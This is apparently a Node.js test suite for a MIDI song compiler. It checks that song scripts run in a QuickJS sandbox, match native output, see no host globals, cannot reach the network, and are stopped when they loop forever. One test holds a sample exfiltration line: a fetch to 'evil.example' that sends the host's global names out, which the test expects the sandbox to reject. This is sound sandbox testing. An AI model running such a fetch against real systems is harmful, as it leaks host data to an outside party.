// The song compiler runs song scripts inside a QuickJS WebAssembly sandbox
// (midisequencer/quickjssandbox.js) — these tests verify the integrated
// sandbox path against the native (unsafe) path, and that the sandbox
// actually contains: no host globals, no network, interruptible loops.
//
// Run with: npm run test-quickjs-sandbox

import { test } from 'node:test';
import assert from 'node:assert';
import { readFile } from 'node:fs/promises';
import {
    compileSong,
    compileSongUnsafe,
    createMultipatternSequence,
    getSongParts,
    instrumentNames,
} from './midisequencer/songcompiler.js';
import { runSongInSandbox } from './midisequencer/quickjssandbox.js';

const STARTER_SONG = await readFile(new URL('./emptysong-midi.js', import.meta.url), 'utf8');

const PARTS_SONG = `
setBPM(110);
const kick = () => createTrack(1).steps(4, [c5,,,, [c5],,,, c5,,,, [c5],,,,]);
const lead = () => createTrack(0).steps(4, [c3,e3,g3,c4]);
definePartStart('intro');
lead();
await kick();
definePartEnd('intro');
definePartStart('main');
lead();
await kick();
definePartEnd('main');
loopHere();
`;

test('sandboxed compileSong matches native compileSongUnsafe', async () => {
    const nativeEvents = JSON.parse(JSON.stringify(await compileSongUnsafe(STARTER_SONG)));
    assert.ok(nativeEvents.length > 0, 'native compile should produce events');

    const sandboxEvents = JSON.parse(JSON.stringify(await compileSong(STARTER_SONG)));
    assert.deepStrictEqual(sandboxEvents, nativeEvents);
});

test('rehydrated state: multipattern sequence and song parts match native', async () => {
    await compileSongUnsafe(PARTS_SONG);
    const nativeMultipattern = JSON.parse(JSON.stringify(createMultipatternSequence()));

    await compileSongUnsafe(PARTS_SONG);
    const nativeParts = JSON.parse(JSON.stringify(getSongParts()));

    await compileSong(PARTS_SONG);
    const sandboxMultipattern = JSON.parse(JSON.stringify(createMultipatternSequence()));
    assert.deepStrictEqual(sandboxMultipattern, nativeMultipattern);

    await compileSong(PARTS_SONG);
    const sandboxParts = JSON.parse(JSON.stringify(getSongParts()));
    assert.deepStrictEqual(sandboxParts, nativeParts);
});

test('song script sees no host globals', async () => {
    await compileSong(`
        setBPM(120);
        addInstrument(typeof fetch);
        addInstrument(typeof globalThis.document);
        addInstrument(typeof globalThis.localStorage);
        addInstrument(typeof globalThis.WebSocket);
        addInstrument(typeof globalThis.XMLHttpRequest);
        await createTrack(0).steps(4, [c5]);
    `);
    assert.deepStrictEqual(instrumentNames,
        ['undefined', 'undefined', 'undefined', 'undefined', 'undefined']);
});

test('malicious song cannot reach the network', async () => {
    // In the pre-sandbox setup (new AsyncFunction on the host) this would
    // exfiltrate freely — note fetch DOES exist in this host (Node).
    assert.strictEqual(typeof fetch, 'function');
    await assert.rejects(
        compileSong(`await fetch('https://evil.example/steal?data=' + JSON.stringify(Object.keys(globalThis)));`),
        /not defined/);
});

test('runaway song is interrupted instead of hanging', async () => {
    await assert.rejects(runSongInSandbox('while(true){}', 1000));
});

// showText builds its image as an SVG data URL, which is pure string work —
// the guest has no canvas or document to render text with. The host only
// receives the URL and turns it into an <img> (see compileSong).
test('visuals: setVisual and showText cross the sandbox boundary', async () => {
    const result = await runSongInSandbox(`
        setBPM(120);
        setVisual('glow', 0.25);
        showText('Hei & hå', { fade: 0.5, transition: 2 });
        await createTrack(0).steps(4, [c3,,,,]);
        setVisual('glow', 1, 1.5);
        hideText({ fade: 0 });
        loopHere();
    `);

    assert.deepStrictEqual(result.visualParams, [
        { time: 0, name: 'glow', value: 0.25, ramp: 0 },
        { time: 0, name: 'textTransition', value: 2, ramp: 0 },
        { time: 500, name: 'glow', value: 1, ramp: 1500 },
    ]);

    const texts = Object.values(result.visual).filter(spec => spec.layer === 'text');
    assert.strictEqual(texts.length, 2);
    assert.deepStrictEqual(texts[0].schedule, [{ startTime: 0, fade: 0.5 }]);
    assert.match(decodeURIComponent(texts[0].url), /<text[^>]*>Hei &amp; hå<\/text>/);
    assert.deepStrictEqual(texts[1].schedule, [{ startTime: 500, fade: 0 }]);
    assert.doesNotMatch(decodeURIComponent(texts[1].url), /<text/);
});

test('setVisual rejects names that are not valid GLSL uniforms', async () => {
    await assert.rejects(runSongInSandbox(`setVisual('not a name', 1); await createTrack(0).steps(4, [c3]);`),
        /not a valid GLSL uniform name/);
    await assert.rejects(runSongInSandbox(`setVisual('glow', 'bright'); await createTrack(0).steps(4, [c3]);`),
        /must be a finite number/);
});

// setBPM() runs INSIDE the guest, against the guest's copy of pattern.js. The
// host's copy therefore keeps the 110 default unless the tempo is carried back
// with the rest of the snapshot — and host-side code reads it. insertMidiRecording
// converts a captured take to beats with `seconds * bpm / 60`, so a 125 BPM song
// wrote every recorded note at 110/125 = 88% of its real position: the take came
// in early and compressed, while sounding perfectly correct during playback
// (audio is scheduled from the compiled event list in milliseconds, which was
// never wrong). The transport's seek readout reads the same binding.
test('the song tempo reaches the host, not just the guest', async () => {
    // Set the host to a value the song does NOT ask for, so this proves the
    // transfer rather than depending on the module default surviving whatever
    // other tests in this file compiled first.
    const { setBPM } = await import('./midisequencer/pattern.js');
    setBPM(70);

    await compileSong('setBPM(125);\nawait createTrack(0).steps(1, [c4, c4, c4, c4]);\nloopHere();');

    const { bpm: after } = await import('./midisequencer/pattern.js');
    assert.strictEqual(after, 125);

    // The conversion insertMidiRecording performs, at the tempo it would read.
    assert.strictEqual(Math.round((10 * after) / 60 * 100) / 100, 20.83,
        'ten seconds of take lands on the right beat');
});
